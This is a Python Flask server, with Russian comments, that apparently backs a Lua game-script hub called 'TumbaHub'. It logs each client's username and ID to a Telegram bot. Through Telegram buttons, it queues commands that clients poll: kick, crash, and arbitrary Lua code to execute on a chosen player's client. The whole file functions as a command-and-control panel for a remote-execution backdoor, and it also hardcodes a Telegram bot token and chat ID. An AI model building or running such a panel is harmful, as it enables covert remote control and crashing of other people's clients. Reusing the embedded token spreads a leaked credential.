from flask import Flask, request, jsonify
import requests
import json # Обязательно!

commands_queue = {}
awaiting_reason = {} # Память бота

app = Flask(__name__)

# Твои данные
TELEGRAM_TOKEN = '8693862606:AAEvhj2EJeSxHhaw0JopIb_oK-COEZKix1g'
TELEGRAM_CHAT_ID = '8426928414'

# Очередь команд
commands_queue = {}
# Память для ожидания причины кика
awaiting_reason = {}
# Память для ожидания скрипта (НОВОЕ)
awaiting_execute = {} 

@app.route('/')
def home():
    return "TumbaHub Server is running!"

@app.route('/api/log_user', methods=['POST'])
def log_user():
    data = request.json
    if not data:
        return jsonify({"status": "error", "message": "No data"}), 400

    username = data.get('username', 'Unknown')
    user_id = data.get('userId', 'Unknown')
    
    if username not in commands_queue:
        commands_queue[username] = []

    msg = f"🟢 [V2] НОВЫЙ ЗАПУСК!\n👤 Ник: {username}\n🆔 ID: {user_id}"
    
    # === СОЗДАЕМ КНОПКИ ДЛЯ УПРАВЛЕНИЯ ===
    # В callback_data зашиваем действие и ник, например "kick_Player1"
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "🥾 Kick", "callback_data": f"kick_{username}"},
                {"text": "💥 Crash", "callback_data": f"crash_{username}"}
            ]
        ]
    }

    # Отправляем сообщение вместе с кнопками (параметр reply_markup)
    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                  json={
                      "chat_id": TELEGRAM_CHAT_ID, 
                      "text": msg,
                      "reply_markup": keyboard
                  })

    return jsonify({"status": "success"})

@app.route('/api/get_command', methods=['GET'])
def get_command():
    username = request.args.get('username')
    
    if username in commands_queue and len(commands_queue[username]) > 0:
        cmd = commands_queue[username].pop(0) # Теперь мы достаем просто строку
        return jsonify({"status": "success", "command": cmd})
    
    return jsonify({"status": "empty"})


@app.route('/api/telegram_webhook', methods=['POST'])
def telegram_webhook():
    update = request.json
    
    # === БЛОК 1: ОБРАБОТКА ТЕКСТА ===
    if update and "message" in update and "text" in update["message"]:
        chat_id = str(update["message"]["chat"]["id"])
        text = update["message"]["text"]
        
        if chat_id == TELEGRAM_CHAT_ID:
            # 1. ГЛАВНОЕ МЕНЮ
            if text == "/menu":
                keyboard = {
                    "inline_keyboard": [
                        [{"text": "👥 Игроки", "callback_data": "menu_players"}],
                        [{"text": "🎮 Игры", "callback_data": "menu_games"}]
                    ]
                }
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                    json={
                        "chat_id": TELEGRAM_CHAT_ID, 
                        "text": "🎛 **Главное меню TumbaHub**\nВыберите раздел:",
                        "reply_markup": keyboard,
                        "parse_mode": "Markdown"
                    }
                )
                return jsonify({"status": "ok"})

            # 2. ЕСЛИ БОТ ЖДЕТ СКРИПТ (Execute)
            if chat_id in awaiting_execute:
                target_user = awaiting_execute.pop(chat_id)
                action = f"/execute__{text}"
                
                if target_user not in commands_queue:
                    commands_queue[target_user] = []
                commands_queue[target_user].append(action)
                
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                    json={"chat_id": TELEGRAM_CHAT_ID, "text": f"✅ Скрипт успешно отправлен в очередь игрока {target_user}!"}
                )
                return jsonify({"status": "ok"})

            # 3. ЕСЛИ БОТ ЖДЕТ ПРИЧИНУ КИКА
            if chat_id in awaiting_reason:
                target_user = awaiting_reason.pop(chat_id)
                action = f"/kick_{text}"
                
                if target_user not in commands_queue:
                    commands_queue[target_user] = []
                commands_queue[target_user].append(action)
                
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                    json={"chat_id": TELEGRAM_CHAT_ID, "text": f"✅ {target_user} кикнут с причиной:\n💬 {text}"}
                )
                return jsonify({"status": "ok"})

            # 4. РУЧНОЙ ВВОД (через пробелы)
            parts = text.split(' ', 2)
            if len(parts) >= 2:
                base_cmd = parts[0]
                target_user = parts[1]
                
                if base_cmd == "/kick" and len(parts) == 3:
                    action = f"/kick_{parts[2]}" 
                elif base_cmd == "/execute" and len(parts) == 3:
                    action = f"/execute__{parts[2]}"
                else:
                    action = base_cmd
                
                if target_user not in commands_queue:
                    commands_queue[target_user] = []
                commands_queue[target_user].append(action)
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                    json={"chat_id": TELEGRAM_CHAT_ID, "text": f"✅ Ручная команда отправлена {target_user}"}
                )

    # === БЛОК 2: ОБРАБОТКА КНОПОК ===
    if update and "callback_query" in update:
        callback = update["callback_query"]
        chat_id = str(callback["message"]["chat"]["id"])
        data = callback["data"]
        callback_id = callback["id"]
        
        if chat_id == TELEGRAM_CHAT_ID:
            
            # === ГЛОБАЛЬНЫЕ КНОПКИ ===
            if data == "menu_games":
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery",
                    json={"callback_query_id": callback_id, "text": "Раздел Игры пока пуст!", "show_alert": True}
                )
                return jsonify({"status": "ok"})
                
            elif data == "menu_players":
                if len(commands_queue) == 0:
                    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT_ID, "text": "⚠️ В базе пока нет игроков."})
                else:
                    # Генерируем кнопки-ники
                    player_buttons = []
                    for player in commands_queue.keys():
                        player_buttons.append([{"text": f"👤 {player}", "callback_data": f"playerprof_{player}"}])
                    
                    keyboard = {"inline_keyboard": player_buttons}
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                        json={
                            "chat_id": TELEGRAM_CHAT_ID, 
                            "text": "👥 **Список активных игроков:**\nВыберите кого-нибудь для управления:",
                            "reply_markup": keyboard,
                            "parse_mode": "Markdown"
                        }
                    )
                requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery", json={"callback_query_id": callback_id})
                return jsonify({"status": "ok"})

            # === ЛОКАЛЬНЫЕ КНОПКИ (С НИКОМ) ===
            parts = data.split('_', 1)
            if len(parts) == 2:
                btn_action = parts[0]
                target_user = parts[1]
                
                # --- ОТКРЫТИЕ ПРОФИЛЯ ---
                if btn_action == "playerprof":
                    # Собираем меню профиля игрока
                    keyboard = {
                        "inline_keyboard": [
                            [{"text": "⚡ Execute Custom Script", "callback_data": f"execselect_{target_user}"}],
                            [{"text": "🥾 Kick", "callback_data": f"kick_{target_user}"}, {"text": "💥 Crash", "callback_data": f"crash_{target_user}"}],
                            [{"text": "🔙 Назад к списку", "callback_data": "menu_players"}]
                        ]
                    }
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                        json={
                            "chat_id": TELEGRAM_CHAT_ID, 
                            "text": f"👤 **Профиль: {target_user}**\nЧто будем делать с этим игроком?", 
                            "reply_markup": keyboard,
                            "parse_mode": "Markdown"
                        }
                    )
                
                # --- ВЫПОЛНЕНИЕ СКРИПТА ---
                elif btn_action == "execselect":
                    awaiting_execute[chat_id] = target_user
                    # Если нажали другую кнопку, очищаем конфликт состояний
                    if chat_id in awaiting_reason: del awaiting_reason[chat_id]
                    
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                        json={"chat_id": TELEGRAM_CHAT_ID, "text": f"✍️ Отправь мне Lua-код для выполнения на клиенте **{target_user}**:", "parse_mode": "Markdown"}
                    )
                
                # --- КИК ---
                elif btn_action == "kick":
                    awaiting_reason[chat_id] = target_user
                    if chat_id in awaiting_execute: del awaiting_execute[chat_id]
                    
                    keyboard = {"inline_keyboard": [[{"text": "Дефолт: Вы были кикнуты", "callback_data": f"defaultkick_{target_user}"}]]}
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                        json={"chat_id": TELEGRAM_CHAT_ID, "text": f"Напиши причину кика для {target_user} или нажми кнопку ниже:", "reply_markup": keyboard}
                    )
                
                elif btn_action == "defaultkick":
                    if chat_id in awaiting_reason:
                        del awaiting_reason[chat_id]
                    action = "/kick"
                    if target_user not in commands_queue: commands_queue[target_user] = []
                    commands_queue[target_user].append(action)
                    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT_ID, "text": f"✅ {target_user} кикнут (дефолт)."})
                    
                # --- КРАШ ---
                elif btn_action == "crash":
                    action = "/crash"
                    if target_user not in commands_queue: commands_queue[target_user] = []
                    commands_queue[target_user].append(action)
                    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT_ID, "text": f"💥 Краш отправлен {target_user}"})
                
            # Убираем часики загрузки с нажатой кнопки
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery", json={"callback_query_id": callback_id})

    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
